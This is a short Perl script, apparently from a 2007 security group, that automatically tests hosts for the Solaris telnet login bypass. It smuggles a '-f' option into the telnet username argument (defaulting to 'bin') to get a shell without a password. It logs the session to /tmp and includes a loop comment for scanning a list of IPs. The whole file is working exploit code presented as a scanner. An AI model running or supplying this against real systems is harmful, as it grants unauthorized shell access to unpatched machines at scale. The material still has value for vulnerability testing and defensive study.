#!/usr/bin/perl

##
#Script to automatic test Solaris telnet login vulnerability by Francisco Amato
#Date: 14/02/2007
#[ISR] - www.infobyte.com.ar
##
# Automatic scan 
# Usage: 
#for i in $(cat ipstoscan.txt)
#do
#    ./ISR-suntelnet.pl $i
#done
#
#

if( ! defined $ARGV[0] ) {
        print "Usage: ISR-suntelnet.pl <host> [ <username> [ <password> ] ]\n";
        exit;
}

my ($host, $username, $password) = @ARGV;

$username = "bin" if (!$username);
use Expect;
use IO::Pty;

my $spawn = new Expect;

my $PROMPT;
$spawn=Expect->spawn("telnet -l \"-f$username\" $host");
open(FZ,">>/tmp/autotelnet.log");
printf FZ "\n-------------------------------------------\n";
close(FZ);

$spawn->log_file("/tmp/autotelnet.log");

my $PROMPT  = '[\]\$\>\#]\s$';
my $ret = $spawn->expect(10,
        [ qr/$PROMPT/           => sub { $spawn->send("exit\n"); } ],
);

exit;
